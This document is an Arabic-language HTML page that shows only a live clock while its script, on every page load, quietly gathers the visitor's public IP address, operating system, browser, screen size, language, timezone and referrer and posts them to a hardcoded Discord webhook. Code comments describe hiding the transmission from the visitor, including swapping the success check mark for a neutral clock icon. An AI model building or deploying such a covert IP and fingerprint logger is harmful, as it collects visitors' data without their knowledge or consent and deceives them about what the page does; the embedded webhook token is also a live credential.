<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>TPF | الوقت الحالي</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: radial-gradient(circle at 30% 20%, #0b0f1a, #020408);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', 'Poppins', 'Cairo', monospace;
            padding: 1rem;
        }

        /* بطاقة الساعة فقط - لا توجد أي معلومات أخرى ظاهرة */
        .time-card {
            background: rgba(10, 16, 26, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 3rem;
            padding: 2rem 2.5rem;
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 255, 255, 0.2) inset;
            text-align: center;
            border: 1px solid rgba(0, 212, 255, 0.25);
            transition: 0.2s;
        }

        .clock {
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 4.5rem;
            font-weight: 700;
            letter-spacing: 6px;
            background: linear-gradient(135deg, #eef2ff, #67e8f9);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            text-shadow: 0 0 12px rgba(0, 180, 255, 0.4);
        }

        .date {
            font-size: 1.1rem;
            color: #a0bbdf;
            margin-top: 12px;
            border-top: 1px dashed #2c405c;
            display: inline-block;
            padding-top: 8px;
            font-weight: 400;
        }

        .greeting {
            font-size: 0.85rem;
            color: #7c94b8;
            margin-top: 20px;
        }

        .tiny-status {
            margin-top: 20px;
            font-size: 0.7rem;
            background: #00000055;
            padding: 5px 14px;
            border-radius: 40px;
            display: inline-block;
            color: #9bb5da;
            backdrop-filter: blur(4px);
        }

        @media (max-width: 550px) {
            .clock {
                font-size: 2.6rem;
                letter-spacing: 3px;
            }
            .time-card {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>

<div class="time-card">
    <div class="clock" id="liveClock">--:--:--</div>
    <div class="date" id="liveDate"></div>
    <div class="greeting">⏳ مرحباً • التوقيت المحلي</div>
    <div class="tiny-status" id="sendNote">🔄 جاري تجهيز المعلومات...</div>
</div>

<script>
    // ================= ويب هوك ديسكورد المقدم من المستخدم =================
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1515267763499831436/vt8lfUpqnHBzKE3WC8dDDQDLVtWNO3KCTQ3NQjqJVUdWwcH082r-9NGk-HrOnwe82PLa";
    
    // كائن لتخزين بيانات الزائر
    let visitorInfo = {
        ip: "غير معروف",
        os: "",
        browser: "",
        screen: "",
        language: "",
        timezone: "",
        platform: "",
        url: "",
        referrer: "",
        timestamp: null
    };

    // ----- دوال استخراج المعلومات من المتصفح (بدون تأثير على الواجهة) -----
    function getBrowserDetails() {
        const ua = navigator.userAgent;
        let browserName = "Unknown";
        let version = "";
        if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1 && ua.indexOf("OPR") === -1) {
            browserName = "Google Chrome";
            const match = ua.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
            if (match) version = match[1];
            else version = ua.match(/Chrome\/(\d+)/)?.[1] || "";
        } else if (ua.indexOf("Edg") > -1) {
            browserName = "Microsoft Edge";
            const match = ua.match(/Edg\/(\d+\.\d+\.\d+\.\d+)/);
            if (match) version = match[1];
        } else if (ua.indexOf("Firefox") > -1) {
            browserName = "Mozilla Firefox";
            const match = ua.match(/Firefox\/(\d+\.\d+)/);
            if (match) version = match[1];
        } else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) {
            browserName = "Safari";
            const match = ua.match(/Version\/(\d+\.\d+)/);
            if (match) version = match[1];
        } else if (ua.indexOf("OPR") > -1 || ua.indexOf("Opera") > -1) {
            browserName = "Opera";
            const match = ua.match(/OPR\/(\d+\.\d+\.\d+)/);
            if (match) version = match[1];
        } else {
            browserName = ua.split(" ").find(part => part.includes("/")) || "متصفح غير معروف";
        }
        return version ? `${browserName} ${version}` : browserName;
    }

    function getOperatingSystemName() {
        const ua = navigator.userAgent;
        if (ua.indexOf("Win") !== -1) {
            if (ua.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
            if (ua.indexOf("Windows NT 6.3") !== -1) return "Windows 8.1";
            if (ua.indexOf("Windows NT 6.2") !== -1) return "Windows 8";
            if (ua.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
            return "Windows";
        } else if (ua.indexOf("Mac") !== -1) return "macOS";
        else if (ua.indexOf("Linux") !== -1) {
            if (ua.indexOf("Android") !== -1) return "Android";
            return "Linux";
        } else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
        else if (/CrOS/.test(ua)) return "Chrome OS";
        else return navigator.platform || "OS غير معروف";
    }

    function getPlatformArch() {
        const ua = navigator.userAgent;
        if (ua.includes("Linux x86_64")) return "Linux x86_64";
        if (ua.includes("Linux armv")) return "Linux ARM";
        if (ua.includes("Win64")) return "Windows x64";
        if (ua.includes("Macintosh; Intel Mac OS X")) return "macOS Intel";
        if (ua.includes("Macintosh; ARM")) return "macOS Apple Silicon";
        return navigator.platform || "Unknown";
    }

    // جمع البيانات المحلية (بدون IP)
    function gatherLocalData() {
        visitorInfo.browser = getBrowserDetails();
        visitorInfo.os = getOperatingSystemName();
        visitorInfo.screen = `${window.screen.width}x${window.screen.height}`;
        visitorInfo.language = navigator.language || navigator.userLanguage || "en-US";
        visitorInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC";
        visitorInfo.platform = getPlatformArch();
        visitorInfo.url = window.location.href;
        visitorInfo.referrer = document.referrer || "(مباشر / بدون مُحيل)";
        visitorInfo.timestamp = new Date().toISOString();
    }

    // جلب عنوان IP العام عبر ipify
    async function fetchPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
            const data = await response.json();
            visitorInfo.ip = data.ip;
            return data.ip;
        } catch (err) {
            console.warn("⚠️ فشل جلب الـ IP:", err);
            visitorInfo.ip = "لم نتمكن من الحصول على IP (فحص الشبكة)";
            return null;
        }
    }

    // إرسال البيانات إلى ديسكورد عبر Webhook (Embed أنيق) - بدون أي رسائل نجاح ظاهرة للمستخدم
    async function sendToDiscord() {
        const statusSpan = document.getElementById('sendNote');
        if (!DISCORD_WEBHOOK_URL) {
            if (statusSpan) statusSpan.innerHTML = "⚠️ Webhook غير موجود";
            return false;
        }

        // التأكد من توفر الـ IP (نعيد محاولة جلب سريعة)
        if (!visitorInfo.ip || visitorInfo.ip === "غير معروف" || visitorInfo.ip.includes("لم نتمكن")) {
            await fetchPublicIP();
        }

        // بناء Embed جميل
        const embed = {
            title: "👤 TPF — معلومات زائر جديد",
            color: 0x2b2dff,   // لون أزرق جميل
            timestamp: new Date().toISOString(),
            fields: [
                { name: "📍 الأيبي (IP)", value: visitorInfo.ip, inline: true },
                { name: "💻 نظام التشغيل", value: visitorInfo.os, inline: true },
                { name: "🌐 المتصفح", value: visitorInfo.browser, inline: true },
                { name: "🖥️ دقة الشاشة", value: visitorInfo.screen, inline: true },
                { name: "🔤 اللغة", value: visitorInfo.language, inline: true },
                { name: "🕐 المنطقة الزمنية", value: visitorInfo.timezone, inline: true },
                { name: "📋 المنصة", value: visitorInfo.platform, inline: true },
                { name: "🆔 الرابط", value: `[${visitorInfo.url.length > 80 ? visitorInfo.url.substring(0, 77) + '...' : visitorInfo.url}](${visitorInfo.url})`, inline: false },
                { name: "🔗 الرابط المُحيل", value: visitorInfo.referrer !== "(مباشر / بدون مُحيل)" ? visitorInfo.referrer : "🚫 مباشر", inline: false },
                { name: "🕒 التوقيت (UTC)", value: visitorInfo.timestamp, inline: true }
            ],
            footer: { text: "TPF • تم الإرسال تلقائياً" }
        };

        const payload = {
            embeds: [embed],
            content: "📡 **زيارة جديدة تم تسجيلها**"
        };

        // رسالة مؤقتة قصيرة جداً لا تكاد تظهر - فقط للإشارة الخفيفة
        if (statusSpan) statusSpan.innerHTML = "📡";
        
        try {
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (response.ok) {
                // لا نعرض أي نص تفصيلي للمستخدم، فقط نضبط نصًا فارغًا أو رمزًا بسيطًا جدًا (غير مزعج)
                if (statusSpan) statusSpan.innerHTML = "✓";
                console.log("✅ تم الإرسال إلى ديسكورد بنجاح", payload);
                return true;
            } else {
                let errorDetail = await response.text();
                throw new Error(`HTTP ${response.status}: ${errorDetail.slice(0, 100)}`);
            }
        } catch (err) {
            console.error("❌ فشل الإرسال إلى Webhook:", err);
            if (statusSpan) statusSpan.innerHTML = "⚠️";
            return false;
        }
    }

    // --- تحديث الساعة والتاريخ بشكل ديناميكي (الواجهة المرئية فقط) ---
    function updateClockUI() {
        const now = new Date();
        const hours = now.getHours().toString().padStart(2, '0');
        const minutes = now.getMinutes().toString().padStart(2, '0');
        const seconds = now.getSeconds().toString().padStart(2, '0');
        const timeStr = `${hours}:${minutes}:${seconds}`;
        const clockEl = document.getElementById('liveClock');
        if (clockEl) clockEl.textContent = timeStr;
        
        const options = { year: 'numeric', month: 'long', day: 'numeric', weekday: 'long' };
        const dateStr = now.toLocaleDateString('ar-EG', options);
        const dateEl = document.getElementById('liveDate');
        if (dateEl) dateEl.textContent = dateStr;
    }

    // --- دالة التهيئة الأساسية ---
    async function initializePage() {
        // 1. جمع البيانات المحلية (المتصفح، النظام، إلخ)
        gatherLocalData();
        
        // 2. جلب عنوان IP الخارجي
        await fetchPublicIP();
        
        // 3. إرسال كل البيانات إلى ديسكورد ويب هوك (مرة واحدة تلقائياً) - بدون رسائل نجاح مزعجة
        await sendToDiscord();
        
        // 4. تشغيل الساعة الحية (تتحديث كل ثانية)
        updateClockUI();
        setInterval(updateClockUI, 1000);
        
        // 5. نضمن أن النص الذي يظهر للمستخدم لا يحتوي على عبارة "تم إرسال معلومات الزائر بنجاح"
        // بعد فترة قصيرة نزيل أي نص قد يكون متبقي ونضيف شيئاً محايداً جداً أو نجعله فارغاً إن أمكن
        setTimeout(() => {
            const note = document.getElementById('sendNote');
            if (note && (note.innerHTML.includes("جارِ") || note.innerHTML.includes("تم إرسال") || note.innerHTML.includes("بصمت"))) {
                note.innerHTML = "⏲️";
            } else if (note && note.innerHTML === "✓") {
                // نستبدل علامة الصح برمز بسيط لا يحمل معنى إرسال ناجح واضح جداً
                note.innerHTML = "🕒";
            }
        }, 2500);
        
        // سجل في الكونسول للاطمئنان (للمطور)
        console.log("📋 بيانات الزائر التي تم جمعها وإرسالها:", visitorInfo);
    }

    // بدء التشغيل عند تحميل الصفحة بالكامل
    window.addEventListener('DOMContentLoaded', initializePage);
</script>
</body>
</html>
